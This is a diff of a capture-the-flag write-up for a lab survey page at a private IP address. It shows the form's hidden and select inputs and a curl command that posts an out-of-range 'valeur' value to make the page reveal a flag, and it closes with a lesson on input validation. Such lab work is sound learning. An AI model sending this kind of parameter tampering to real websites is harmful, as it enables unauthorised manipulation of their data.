@@ -1,10 +1,29 @@
 # Survey Page
 __http://192.168.56.101/?page=survey__
+
 ## Description
 This is a survey page where users can make choices and provide input. Each row of the "Make your choice" table is an HTML form element. The form action is set to "#" which means it submits to itself, and the form method is set to POST.
 
 ## Form Inputs
 The form has several inputs:
+
+```<input type="hidden" name="sujet" value="2">
+    <input type="hidden" name="sujet" value="3">
+    <input type="hidden" name="sujet" value="4">
+    <input type="hidden" name="sujet" value="5">
+    <input type="hidden" name="sujet" value="6"> 
+<SELECT name="valeur" onChange='javascript:this.form.submit();'>
+						<option value="1">1</option>
+						<option value="2">2</option>
+						<option value="3">3</option>
+						<option value="4">4</option>
+						<option value="5">5</option>
+						<option value="6">6</option>
+						<option value="7">7</option>
+						<option value="8">8</option>
+						<option value="9">9</option>
+						<option value="10">10</option>
+					</SELECT>```
 
 1. Input name "sujet" (type: hidden): This input has a value range from 2 to 6.
 2. Input name "valeur" (type: select): This input has a value range from 1 to 10.
@@ -14,7 +33,7 @@ The "valeur" element also has an onchange JavaScript attribute, which automatica
 ## Flag
 If a POST request is submitted with the "valeur" value greater than 10, the page will display the flag.
 
-```curl -s 'http://192.168.56.101/index.php?page=survey' --data 'sujet=2&valeur=10'  -o _10.html && curl -s 'http://192.168.56.101/index.php?page=survey' --data 'sujet=2&valeur=110'  -o _110.html && diff _10.html _110.html | sed 's/.*flag is \(.*\)<\/h2>.*/\1/' > flag```
+```curl -s 'http://192.168.56.101/index.php?page=survey' --data 'sujet=2&valeur=10'  -o _10.html && curl -s 'http://192.168.56.101/index.php?page=survey' --data 'sujet=2&valeur=111'  -o _111.html && diff _10.html _111.html | sed 's/.*flag is \(.*\)<\/h2>.*/\1/' > flag```
 
 ## Key Takeaway
 The key takeaway from this experience is the importance of data sanitization and validation to prevent potential security vulnerabilities. Whether variables are passed in the URL through a GET request or through a more complex POST request, proper measures should be taken to ensure the accuracy and safety of user data.</br>
